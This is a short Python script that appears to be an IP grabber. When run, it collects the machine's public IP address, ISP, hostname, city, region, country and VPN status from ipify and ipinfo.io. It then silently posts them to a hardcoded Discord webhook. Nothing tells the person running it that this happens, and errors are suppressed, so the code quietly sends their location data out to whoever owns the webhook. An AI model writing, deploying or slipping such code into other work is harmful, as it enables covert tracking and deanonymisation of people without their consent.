import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1444092786210111632/x8hPF9-vXrKOy_3QJwZKDFvRCsm_7PzVuH69t_rqczttGBoWIXhlexfu9fvxMbrUeijn"
IPINFO_TOKEN = ""

def get_ipinfo(ip):
    url = f"https://ipinfo.io/{ip}"
    if IPINFO_TOKEN:
        url += f"?token={IPINFO_TOKEN}"
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        return resp.json()
    except Exception:
        return None

def get_ip_privacy(ip):
    url = f"https://ipinfo.io/{ip}/privacy"
    if IPINFO_TOKEN:
        url += f"?token={IPINFO_TOKEN}"
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        return resp.json()
    except Exception:
        return None

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org")
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException:
        return None

def send_ip_to_discord(message):
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except requests.RequestException:
        pass

def main():
    ip = get_public_ip()
    if not ip:
        return
    info = get_ipinfo(ip)
    privacy = get_ip_privacy(ip)
    org = info.get("org", "Unknown") if info else "Unknown"
    city = info.get("city", "Unknown") if info else "Unknown"
    region = info.get("region", "Unknown") if info else "Unknown"
    country = info.get("country", "Unknown") if info else "Unknown"
    hostname = info.get("hostname", "Unknown") if info else "Unknown"
    vpn = privacy.get("vpn", False) if privacy else False
    details = [
        f"User's public IP address: {ip}{' (VPN)' if vpn else ''}",
        f"ISP: {org}",
        f"Hostname: {hostname}",
        f"Location: {city}, {region}, {country}"
    ]
    message = "\n".join(details)
    send_ip_to_discord(message)

if __name__ == "__main__":
    main()
